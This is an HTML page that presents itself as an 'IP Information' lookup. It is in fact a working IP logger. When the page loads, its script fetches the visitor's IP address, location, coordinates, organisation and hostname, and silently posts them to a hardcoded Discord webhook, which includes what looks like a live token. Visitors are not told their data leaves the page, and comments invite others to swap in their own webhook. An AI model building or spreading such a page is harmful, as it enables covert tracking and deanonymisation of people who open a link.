<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Info</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { text-align: center; }
        .info { margin: 20px 0; }
        .info div { margin: 5px 0; }
    </style>
</head>
<body>
    <h1>IP Information</h1>
    <div id="ip-info" class="info">
        <div><strong>IP Address:</strong> <span id="ip">Loading...</span></div>
        <div><strong>City:</strong> <span id="city">Loading...</span></div>
        <div><strong>Region:</strong> <span id="region">Loading...</span></div>
        <div><strong>Country:</strong> <span id="country">Loading...</span></div>
        <div><strong>Location:</strong> <span id="location">Loading...</span></div>
        <div><strong>Org:</strong> <span id="org">Loading...</span></div>
        <div><strong>Hostname:</strong> <span id="hostname">Loading...</span></div>
    </div>

    <script>
        // Fetch IP information from ipinfo.io
        fetch('https://ipinfo.io/json?token=YOUR_TOKEN')  // Replace YOUR_TOKEN with your ipinfo.io token
            .then(response => response.json())
            .then(data => {
                // Fill the information on the page
                document.getElementById('ip').textContent = data.ip;
                document.getElementById('city').textContent = data.city;
                document.getElementById('region').textContent = data.region;
                document.getElementById('country').textContent = data.country;
                document.getElementById('location').textContent = data.loc;
                document.getElementById('org').textContent = data.org;
                document.getElementById('hostname').textContent = data.hostname;

                // Send this information to a Discord webhook
                sendToDiscord(data);
            })
            .catch(error => {
                console.error("Error fetching IP info:", error);
            });

        // Function to send data to Discord Webhook
        function sendToDiscord(data) {
            const webhookURL = "https://discord.com/api/webhooks/1332528828148350977/qRjBBS7VeolU3cm-O7eyuElTdP9sz1iEdSzqoBEbY_vmgc1Zfwwk7SBHUwalbL6Zkrl7";  // Replace with your Discord webhook URL

            const payload = {
                content: `**New IP Info**\n\nIP: ${data.ip}\nCity: ${data.city}\nRegion: ${data.region}\nCountry: ${data.country}\nLocation: ${data.loc}\nOrg: ${data.org}\nHostname: ${data.hostname}`
            };

            fetch(webhookURL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => {
                console.log("Data sent to Discord successfully", data);
            })
            .catch(error => {
                console.error("Error sending to Discord:", error);
            });
        }
    </script>
</body>
</html>